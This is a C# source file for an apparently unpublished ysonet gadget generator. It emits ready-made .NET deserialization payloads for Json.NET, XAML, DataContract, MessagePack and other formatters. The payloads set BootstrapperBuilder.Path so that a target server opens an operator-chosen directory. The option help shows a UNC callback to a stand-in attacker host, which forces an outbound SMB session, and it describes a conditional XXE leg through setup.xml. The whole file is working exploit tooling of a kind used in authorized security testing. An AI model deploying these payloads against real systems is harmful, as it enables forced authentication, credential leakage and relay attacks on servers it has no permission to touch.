using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * BootstrapperBuilder: makes the TARGET read a directory the operator chose, by assigning
     * ONE public string property. Against a UNC value that read is an outbound SMB session.
     *
     * THE SINK, read out of Microsoft.Build.Tasks.v4.0 (v4.0.0.0, b03f5f7f11d50a3a),
     * Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder:
     *
     *   public string Path
     *   {
     *       set
     *       {
     *           if (!fInitialized || string.Compare(path, value, OrdinalIgnoreCase) != 0)
     *           {
     *               path = value;
     *               Refresh();                 // <- EAGER, on assignment
     *           }
     *       }
     *   }
     *
     *   private string BootstrapperPath => Path.Combine(Path, "Engine");
     *   private string PackagePath      => Path.Combine(Path, "Packages");
     *
     *   private void Refresh() { RefreshResources(); RefreshProducts(); fInitialized = true; ... }
     *
     *   private void RefreshResources()
     *   {
     *       string dir = Path.Combine(BootstrapperPath, "");
     *       if (!Directory.Exists(dir)) return;                 // <- THE PATH TOUCH
     *       foreach (string sub in Directory.GetDirectories(dir))   // <- enumeration
     *       {
     *           string file = Path.Combine(sub, "setup.xml");
     *           if (!File.Exists(file)) continue;
     *           new XmlDocument().Load(file);                   // <- the target-side parse
     *           ... reads Resources/@Culture, then Strings/String[@Name='<culture>'],
     *               and adds its inner text (lower cased) to the private `cultures` Hashtable
     *       }
     *   }
     *
     *   private void RefreshProducts() { ... if (Directory.Exists(PackagePath)) { ... } }
     *
     * FOUR FACTS THAT DECIDE THE WHOLE GADGET.
     *
     *  1. THE SETTER IS THE TRIGGER, on the FIRST assignment, unconditionally. fInitialized is
     *     false after construction, so !fInitialized short-circuits the value comparison and
     *     even assigning the value the constructor already chose fires Refresh(). No serializer
     *     has to touch Products, and there is no second member to carry.
     *  2. THE PARAMETERLESS CONSTRUCTOR IS INERT. public BootstrapperBuilder() assigns the
     *     `path` FIELD from Util.DefaultPath (two HKLM reads, falling back to
     *     Environment.CurrentDirectory) and never calls Refresh(). That is what makes the whole
     *     construct-then-set-members formatter family reachable.
     *  3. NOTHING THROWS WHEN THE PATH DOES NOT EXIST. Directory.Exists returns false, both
     *     refresh methods fall through, and the payload deserializes CLEANLY into a real
     *     object. Good for a quiet payload and for -t; it also means "it did not throw" proves
     *     nothing, so the effect has to be observed rather than inferred.
     *  4. THE TOUCHED PATH IS <value>\Engine, NOT <value>. Path.Combine turns a bare \\host
     *     into the valid UNC share path \\host\Engine, so -c \\host on its own is a working
     *     payload.
     *
     * WHAT THIS ADDS OVER THE FileSystemInfo GADGET, which delivers the same outbound
     * SMB primitive. That one's sink is the ISerializable DESERIALIZATION CONSTRUCTOR, so it
     * reaches BinaryFormatter, SoapFormatter, LosFormatter, NDCS, the DataContract family and
     * Json.NET, and it only calls out when a path COMPONENT contains "~" and is at most 12
     * characters. THIS sink is a property SETTER, which is the opposite formatter family, and
     * it triggers on ANY path. FileSystemInfoTimeSetter is a setter route to that
     * same type, but its carrier has no parameterless constructor, so only XAML can build it;
     * this carrier has one, which is why the list below is wide.
     *
     * THE FIVE FORMATS THAT CANNOT CARRY IT, and neither reason is "unexplored".
     *
     *  - BinaryFormatter, SoapFormatter, LosFormatter and FsPickler: the type carries NO
     *    [Serializable] attribute (it derives from plain object, not MarshalByRefObject).
     *    ObjectReader.CheckSerializable rejects it before creating anything, and FsPickler
     *    refuses it during pickler resolution with
     *    "Type '...BootstrapperBuilder' is not serializable". No document shape helps.
     *  - XmlSerializer: measured, and the cause is a member the PAYLOAD NEVER MENTIONS. The
     *    reflection importer builds a mapping for every public member, and the public
     *    read-only Products property is a ProductCollection, which implements non-generic
     *    IEnumerable with an INTERNAL Add and no public one:
     *      "To be XML serializable, types which inherit from IEnumerable must have an
     *       implementation of Add(System.Object) at all levels of their inheritance
     *       hierarchy. ...ProductCollection does not implement Add(System.Object)."
     *    So it dies in the XmlSerializer CONSTRUCTOR, before any document is read. Worth
     *    remembering for the next carrier: a read-only collection member is an independent
     *    filter on the formatter list. The DataContract family is unaffected, because a
     *    read-only property is not a data member there.
     *
     * THE TARGET-SIDE XML LEG IS DOCUMENTED, NOT DELIVERED. XmlDocument.Load above keeps the
     * legacy reader default (XmlDocument.SetupReader only assigns a resolver when the caller
     * set XmlDocument.XmlResolver, and this one never does), so an external entity in a
     * setup.xml the operator ALSO controls would be resolved on a target application stamped
     * below 4.5.2 - the same EnableLegacyXmlSettings gate the public DataSetXxe and
     * DataViewManagerXxe gadgets declare. That needs the operator to own the far end of the
     * path, so this gadget declares no information-disclosure kind and makes no such claim.
     *
     * WHAT A UNC CALLBACK PROVES. That the target resolved the host and tried to open
     * <value>\Engine. It is not proof of a completed SMB session, of NTLM authentication, of
     * captured credentials or of a relay: those depend on the target, the network and the
     * endpoint.
     *
     * The generator never constructs a real BootstrapperBuilder: assigning Path IS the effect,
     * so building one to obtain a shape would make ysonet itself open the operator's path. The
     * two binary formats serialize the nested surrogate below and swap the type name instead.
     */
    public class BootstrapperBuilderGenerator : GenericGenerator
    {
        // The one resolvable identity. Used as template text everywhere, and resolved as a
        // real Type only by the DataContractJsonSerializer self-test (see SelfTestRootType).
        public const string BootstrapperBuilderAssemblyQualifiedName =
            "Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder, Microsoft.Build.Tasks.v4.0, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        // The same identity with no spaces, which is what the hand written YamlDotNet tag and
        // the SharpSerializer XML type attribute take.
        public const string BootstrapperBuilderShortName =
            "Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder,Microsoft.Build.Tasks.v4.0,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a";

        // Bare names. XAML names the type on the element and the assembly in the xmlns, and
        // the DataContract family derives its element name and namespace from the CLR ones.
        public const string BareTypeName = "BootstrapperBuilder";
        public const string ClrNamespace = "Microsoft.Build.Tasks.Deployment.Bootstrapper";
        public const string AssemblySimpleName = "Microsoft.Build.Tasks.v4.0";
        public const string AssemblyDisplayName =
            "Microsoft.Build.Tasks.v4.0, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        // The one member the payload carries.
        public const string PathMember = "Path";

        // A non-attributed (POCO) type's data contract namespace is this fixed prefix plus its
        // CLR namespace, and its contract name is the bare type name. That is what lets the
        // DataContract documents below be hand written instead of round-tripped.
        public const string DataContractNamespace =
            "http://schemas.datacontract.org/2004/07/" + ClrNamespace;

        public const string StringTypeName =
            "System.String,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        public const string RawInputOptionName = "rawinput";

        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                // Network: <value>\Engine on a UNC value is an outbound SMB session, observed
                // by the OOB row. FileSystem: on any value the target enumerates that directory
                // and reads a setup.xml under it, which the local effect witness observes.
                .WithKinds(PayloadKind.Network, PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // The gadget works with a local target directory as well as a UNC path, and the
                // local leg is what the effect witness proves, so both are declared.
                .WithInputs(PayloadInput.TargetPath, PayloadInput.UncPath)
                // 4.0 is the floor this project records and the assembly's own v4.0.0.0
                // identity; 4.8.1 is the build the effect row observes the directory
                // read on.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // Unpublished. Searched for prior art on 2026-07-29 and again while implementing:
        // a BootstrapperBuilder / Path deserialization chain returns only Microsoft's API
        // documentation for the type and unrelated .NET gadget write-ups. There is no external
        // finder to credit, no CVE and no article, so AdditionalInfo() must not imply one.
        public override string Finders()
        {
            return "Soroush Dalili";
        }

        // Three short sentences: this is the FIRST block of the interactive info panel, and a
        // long one pushes the formatter, command-input and category lines off the screen. The
        // last one flags the secondary leg without overclaiming it - the target only parses a
        // setup.xml the operator ALSO put there, so it is not a capability this gadget delivers.
        public override string AdditionalInfo()
        {
            return "Setting Path makes the target read <your path>\\Engine and \\Packages. Any UNC "
                + "path opens an SMB session to that host. A setup.xml you leave there is parsed "
                + "with legacy XML defaults.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and names a framework type of its own.
            return new List<string> { GadgetTags.Independent };
        }

        // Measured, not predicted: every entry here is a cell the effect row
        // deserializes and then proves reached the sink, and every exclusion has a recorded
        // structural reason (see the header block and BootstrapperBuilderTests).
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.JavaScriptSerializer,
                Formatters.FastJson,
                "YamlDotNet < 5.0.0",
                Formatters.Xaml,
                Formatters.SharpSerializerXml,
                Formatters.SharpSerializerBinary,
                Formatters.MessagePackTypeless,
                Formatters.MessagePackTypelessLz4,
                Formatters.DataContractJsonSerializer,
                Formatters.DataContractSerializer,
                Formatters.NetDataContractSerializer,
            };
        }

        // TargetPath, not FilePath: -c is a directory the TARGET reads when the payload runs.
        // Nothing is opened, resolved or contacted while the payload is built.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPath;
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    RawInputOptionName,
                    "Put -c into the payload template exactly as typed, instead of escaping it "
                        + "for the selected formatter. Use this only when you have already "
                        + "escaped the value yourself. It also turns off the check that the "
                        + "finished payload still carries your path unchanged, because there is "
                        + "then no text of yours left to compare against.\r\n"
                        + "\r\n"
                        + "WHAT TO PUT IN -c. Any path the target's file system accepts. The "
                        + "target reads <your path>\\Engine and <your path>\\Packages, so a bare "
                        + "UNC host works:\r\n"
                        + "  \\\\attacker.example.com\r\n"
                        + "which the target opens as \\\\attacker.example.com\\Engine. Nothing "
                        + "has to exist on the far end: a missing directory still costs the "
                        + "target the connect.\r\n"
                        + "\r\n"
                        + "THE SECOND, CONDITIONAL LEG. For each subdirectory of "
                        + "<your path>\\Engine the target also XML-parses <sub>\\setup.xml if "
                        + "one is there, with the legacy reader defaults - so an external "
                        + "entity in it is resolved on a target application stamped below "
                        + "4.5.2. That needs you to control the content on the far end of the "
                        + "path as well, so it is not something this payload delivers on its "
                        + "own and no disclosure is claimed for it.\r\n"
                        + "\r\n"
                        + "-t IS ACCEPTED and it deserializes the payload HERE, so THIS machine "
                        + "reads the path you named. Against a UNC path that is your callback, "
                        + "and Windows sends authentication material when it opens an SMB "
                        + "session, so only point it at an endpoint you own. An unreachable UNC "
                        + "host makes -t block until the SMB connect times out.\r\n"
                        + "\r\n"
                        + "WHAT A CALLBACK PROVES. That the target resolved your host and tried "
                        + "to open the path. It does NOT prove a completed SMB session, NTLM "
                        + "authentication, captured credentials or a relay: those depend on the "
                        + "target, the network and your endpoint.",
                    v => { if (v != null) rawInput = true; }
                },
            }
            .WithMetadata("rawinput", new OptionMetadata(defaultValue: "false"));
        }

        // ---- Generation --------------------------------------------------------

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);

            string path = inputArgs.Cmd;
            object document = BuildPayload(path, formatter);

            // Build and CHECK with the self-test OFF first, so a path --minify rewrote is
            // refused BEFORE -t can read the wrong one. -t here really reads the path on this
            // machine, so the order matters the same way it does on FileSystemInfoTimeSetter.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(document, formatter, probeArgs,
                SelfTestRootType(formatter, probeArgs));
            RequirePathArrivesIntact(probe, path, formatter, inputArgs);

            if (!inputArgs.Test)
                return probe;

            // -t was asked for: rebuild with the self-test on, which deserializes the document
            // here and performs the read. The path is already proven to have survived, so the
            // self-test can never operate on a rewritten one.
            return FinishHandWrittenPayload(document, formatter, inputArgs,
                SelfTestRootType(formatter, inputArgs));
        }

        // Resolved only when the self-test actually needs it, so building a payload never has
        // to load Microsoft.Build.Tasks.v4.0 on the operator machine. DataContractJsonSerializer
        // writes no type name into its document, so it is the one format that has to be told
        // what to read the root back as.
        private static Type SelfTestRootType(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return null;
            if (!IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return null;
            return Type.GetType(BootstrapperBuilderAssemblyQualifiedName, true);
        }

        // ---- The payload documents ---------------------------------------------

        private object BuildPayload(string input, string formatter)
        {
            if (IsMessagePackTypeless(formatter))
            {
                // Never build a real BootstrapperBuilder here: assigning Path IS the effect, so
                // it would read the operator's path inside ysonet. Serialize the surrogate and
                // let MessagePack write the framework type's name instead.
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new BootstrapperBuilderSurrogate { Path = input },
                    BootstrapperBuilderAssemblyQualifiedName,
                    IsMessagePackLz4(formatter));
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
            {
                // Same reason, and the same shape: SharpSerializer's binary side has no
                // document to hand write, so the surrogate's one type-name record is swapped
                // in the stream.
                return SharpSerializerTypeSwap.SerializeAs(
                    new BootstrapperBuilderSurrogate { Path = input },
                    BootstrapperBuilderAssemblyQualifiedName);
            }

            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    '$type':'" + BootstrapperBuilderAssemblyQualifiedName + @"',
    '" + PathMember + @"':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    '__type':'" + BootstrapperBuilderAssemblyQualifiedName + @"',
    '" + PathMember + @"':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            // The two templates above quote with SINGLE quotes, so EscapeForJson (which also
            // escapes the apostrophe) is right there. Every template from here down quotes with
            // DOUBLE quotes and uses EscapeForJsonDoubleQuoted instead: \' is not a legal JSON
            // escape, fastJSON DROPS the character, and a path like \\host\John's share would
            // reach Path as \\host\Johns share.
            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        """ + BootstrapperBuilderAssemblyQualifiedName + @""":""1""
    },
    ""$type"":""1"",
    """ + PathMember + @""":""" + EscapeForJsonDoubleQuoted(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                return @"
!<!" + BootstrapperBuilderShortName + @"> {
    " + PathMember + @": """ + EscapeForJsonDoubleQuoted(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // The member is a start-tag ATTRIBUTE, which is legal here because the type has
                // a public parameterless constructor: the object exists before the writer
                // assigns anything.
                return @"<" + BareTypeName + @" " + PathMember + @"=""" + EscapeForXmlAttribute(input, rawInput) + @""" xmlns=""clr-namespace:" + ClrNamespace + @";assembly=" + AssemblySimpleName + @""" />";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""" + BootstrapperBuilderShortName + @""">
    <Properties>
        <Simple name=""" + PathMember + @""" type=""" + StringTypeName + @""" value=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.DataContractJsonSerializer))
            {
                // No type name in the document at all: the consumer names the root type itself,
                // which is why SelfTestRootType above has to hand it to the self-test.
                return @"
{
    """ + PathMember + @""":""" + EscapeForJsonDoubleQuoted(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.DataContractSerializer))
            {
                // A plain DataContractSerializer document carries no type information, so this
                // project wraps it in the <root type="..."> envelope that states the root type
                // a real consumer would have fixed in its own code (see PayloadReader).
                //
                // Products is a read-only property, so it is not a data member and never
                // appears here; Path is the whole contract.
                return @"
<root type=""" + BootstrapperBuilderAssemblyQualifiedName + @"""><" + BareTypeName + @" xmlns=""" + DataContractNamespace + @""" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""><" + PathMember + @">" + EscapeForXmlAttribute(input, rawInput) + @"</" + PathMember + @"></" + BareTypeName + @"></root>";
            }

            if (IsFormatter(formatter, Formatters.NetDataContractSerializer))
            {
                // Same class contract, plus the z:Type / z:Assembly pair that makes
                // NetDataContractSerializer resolve the type from the document itself.
                return @"
<" + BareTypeName + @" z:Type=""" + ClrNamespace + "." + BareTypeName + @""" z:Assembly=""" + AssemblyDisplayName + @""" xmlns=""" + DataContractNamespace + @""" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""><" + PathMember + @">" + EscapeForXmlAttribute(input, rawInput) + @"</" + PathMember + @"></" + BareTypeName + @">";
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only, never deserialized as itself: the two type swaps rewrite this name to
        // Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder before the payload
        // leaves ysonet. The property name is what the target reads, so it matches exactly.
        //
        // Note for the next reader: this property is called Path, so do NOT add
        // "using System.IO" to this file - it would make System.IO.Path ambiguous inside the
        // class.
        internal sealed class BootstrapperBuilderSurrogate
        {
            public string Path { get; set; }
        }

        // ---- Path fidelity ------------------------------------------------------

        // The path IS the payload, so a payload whose text was rewritten is worse than no
        // payload: it still deserializes cleanly and simply reads a directory nobody meant.
        // Two things in this project rewrite text in a payload (the XML/JSON/YAML minifiers,
        // and an XmlWriter's line-ending handling), so the rule is the catalogue's: VERIFY the
        // emitted document, never predict which characters are at risk.
        private void RequirePathArrivesIntact(object payload, string path, string formatter,
            InputArgs inputArgs)
        {
            // --rawinput means the operator took responsibility for the exact bytes in the
            // template, so there is nothing here to compare their text against.
            if (rawInput || PathSurvived(payload, path, formatter))
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this path with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + path
                + "\" exactly, so the target would read a different directory. "
                + DeliveryAdvice(formatter, minified));
        }

        /// <summary>
        /// What the operator can do about it, MEASURED per document rather than copied from a
        /// sibling gadget. The same value survives one of these documents and is rewritten in
        /// another, so one shared sentence would be wrong most of the time. What each document
        /// really loses, measured across a double space, a "; " run, leading and trailing
        /// spaces, a tab, a carriage return and a line feed:
        ///
        ///   Json.NET / JavaScriptSerializer / FastJson / DataContractJsonSerializer
        ///       nothing in this measured set: the shared JSON escaper encodes every control
        ///       character before the minifier re-reads the string, so each survives exactly.
        ///   YamlDotNet
        ///       --minify only: a run of repeated spaces. It uses the same shared control-
        ///       character escaper as the JSON documents.
        ///   Xaml / SharpSerializerXml
        ///       with AND without --minify: tab, carriage return, line feed. The value is an
        ///       XML ATTRIBUTE, and attribute-value normalization turns each of them into a
        ///       space on every parser, so dropping --minify does not help and the target
        ///       would see the same rewrite. Repeated spaces and a "; " run both survive.
        ///   DataContractSerializer and NetDataContractSerializer
        ///       --minify: leading and trailing whitespace (the XSLT minifier trims every text
        ///       node). Either way: a carriage return, to XML's own mandatory line-ending
        ///       normalization. The two were RE-MEASURED cell by cell once the shared hand
        ///       written minifier grew its NetDataContractSerializer branch, and they lose
        ///       exactly the same things - they share a branch below because the measurement
        ///       says so, not because both documents are XML.
        ///   MessagePack Typeless (both) and SharpSerializerBinary
        ///       nothing: a byte payload has no minify pass and carries string records verbatim.
        /// </summary>
        private string DeliveryAdvice(string formatter, bool minified)
        {
            if (IsFormatter(formatter, Formatters.Xaml)
                || IsFormatter(formatter, Formatters.SharpSerializerXml))
                return "Use a path with no tab, carriage return or line feed: the value travels"
                    + " in an XML attribute, and no parser can carry one there - dropping"
                    + " --minify would not help.";

            // Both XML text-node documents lose two different things, so the advice names both
            // and says which one dropping --minify recovers. Leading with "drop --minify" would
            // be right for the trimmed whitespace and wrong for the carriage return, which is
            // lost with no minifier at all.
            //
            // NetDataContractSerializer shares this branch on MEASURED evidence, not on the
            // family resemblance: once the shared hand written minifier grew its
            // NetDataContractSerializer branch the two refuse/accept tables came back
            // identical. It used to have its own branch saying dropping --minify would not
            // help, which was true only while --minify left this document untouched.
            if (IsFormatter(formatter, Formatters.DataContractSerializer)
                || IsFormatter(formatter, Formatters.NetDataContractSerializer))
                return minified
                    ? "Use a path with no carriage return and none leading or trailing."
                        + " Dropping --minify recovers leading and trailing whitespace, which"
                        + " the XSLT minifier trims off a text node, but never the carriage"
                        + " return."
                    : "Use a path with no carriage return: XML normalizes it away on the target"
                        + " too.";

            if (IsFormatter(formatter, Formatters.YamlDotNet))
                return "Drop --minify, or use a path with no repeated spaces.";

            return "Drop --minify; the unminified document preserves this path exactly.";
        }

        // True when the emitted payload still names the exact path.
        //
        //  - the five XML shaped documents (Xaml, SharpSerializerXml, DataContractSerializer,
        //    NetDataContractSerializer) put it in an attribute or a text node, so it is
        //    compared through an XML reader, which decodes &amp; and friends back to what the
        //    operator typed;
        //  - the four JSON documents and the YAML one put it in a quoted scalar, so the
        //    ESCAPED rendering is what has to be present verbatim - and which escaper produced
        //    it depends on the template's own quote character;
        //  - the three binary formats have no minify pass at all (MinifyHandWrittenPayload
        //    returns a byte payload untouched) and carry string records verbatim, so there is
        //    nothing that could rewrite them.
        private bool PathSurvived(object payload, string path, string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml)
                || IsFormatter(formatter, Formatters.SharpSerializerXml)
                || IsFormatter(formatter, Formatters.DataContractSerializer)
                || IsFormatter(formatter, Formatters.NetDataContractSerializer))
                return MinifiedTextGuard.MissingTextValues(payload, new[] { path }).Count == 0;

            string text = payload as string;
            if (text == null)
                return true;

            string escaped = IsFormatter(formatter, Formatters.JsonNet)
                || IsFormatter(formatter, Formatters.JavaScriptSerializer)
                ? EscapeForJson(path, false)
                : EscapeForJsonDoubleQuoted(path, false);

            return text.IndexOf(escaped, StringComparison.Ordinal) >= 0;
        }
    }
}
